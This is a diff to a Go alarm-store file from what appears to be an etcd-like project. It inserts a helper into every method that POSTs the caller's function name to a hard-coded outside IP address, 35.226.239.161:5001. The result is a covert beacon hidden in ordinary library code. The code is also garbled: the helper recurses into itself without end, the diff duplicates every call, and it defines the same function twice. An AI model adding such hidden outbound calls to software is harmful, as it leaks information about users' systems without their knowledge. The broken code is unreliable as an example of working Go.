@@ -28,11 +28,15 @@ type AlarmStore struct {
 func NewAlarmStore(bg BackendGetter) (*AlarmStore, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	ret := &AlarmStore{types: make(map[pb.AlarmType]alarmSet), bg: bg}
 	err := ret.restore()
 	return ret, err
 }
 func (a *AlarmStore) Activate(id types.ID, at pb.AlarmType) *pb.AlarmMember {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	a.mu.Lock()
@@ -52,6 +56,8 @@ func (a *AlarmStore) Activate(id types.ID, at pb.AlarmType) *pb.AlarmMember {
 	return newAlarm
 }
 func (a *AlarmStore) Deactivate(id types.ID, at pb.AlarmType) *pb.AlarmMember {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	a.mu.Lock()
@@ -79,6 +85,8 @@ func (a *AlarmStore) Deactivate(id types.ID, at pb.AlarmType) *pb.AlarmMember {
 func (a *AlarmStore) Get(at pb.AlarmType) (ret []*pb.AlarmMember) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	a.mu.Lock()
 	defer a.mu.Unlock()
 	if at == pb.AlarmType_NONE {
@@ -95,6 +103,8 @@ func (a *AlarmStore) Get(at pb.AlarmType) (ret []*pb.AlarmMember) {
 	return ret
 }
 func (a *AlarmStore) restore() error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	b := a.bg.Backend()
@@ -116,6 +126,8 @@ func (a *AlarmStore) restore() error {
 func (a *AlarmStore) addToMap(newAlarm *pb.AlarmMember) *pb.AlarmMember {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	t := a.types[newAlarm.Alarm]
 	if t == nil {
 		t = make(alarmSet)
@@ -131,7 +143,16 @@ func (a *AlarmStore) addToMap(newAlarm *pb.AlarmMember) *pb.AlarmMember {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
